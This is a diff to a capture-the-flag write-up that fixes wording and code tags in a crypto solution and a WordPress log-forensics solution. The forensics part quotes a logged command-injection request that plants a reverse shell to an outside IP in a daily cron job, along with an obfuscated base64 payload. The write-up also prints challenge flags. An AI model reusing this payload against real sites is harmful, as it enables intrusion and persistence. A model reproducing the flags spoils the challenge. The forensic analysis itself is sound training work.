@@ -18,14 +18,14 @@ def main():
     with open('output.txt', 'w') as f:
         f.write(f'{hex_encoded}\n{base64_encoded}')
 ```
-The first half is hex encoded while the other half is hex encoded. After decoding the output we get the flag
-```
+The first half is hex encoded while the other half is base64 encoded. After decoding the output we get the flag
+```bash
 HTB{kn0w1ng_h0w_t0_1d3nt1fy_3nc0d1ng_sch3m3s_1s_cruc14l_f0r_a_crypt0gr4ph3r___4ls0_d0_n0t_c0nfus3_enc0d1ng_w1th_encryp510n!}
 ```
 ## Forensics
 ### Vulnerable season
 We grep for 200 ok logs then we find this log
-```
+```bash
 82.179.92.206 - - [28/Sep/2023:05:21:22 -0400] "GET /wordpress/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:echo%20%22sh%20-i%20%3E&%20/dev/tcp/82.179.92.206/7331%200%3E&1%22%20%3E%20/etc/cron.daily/testconnect%20&&%20Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;echo%20$Mz$Tz$Vz$az$Kz$Oz|base64%20-d|rev:NULL:NULL HTTP/1.1" 200 512 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
 ```
 We build the base64 string from the echo pattern and we decode it
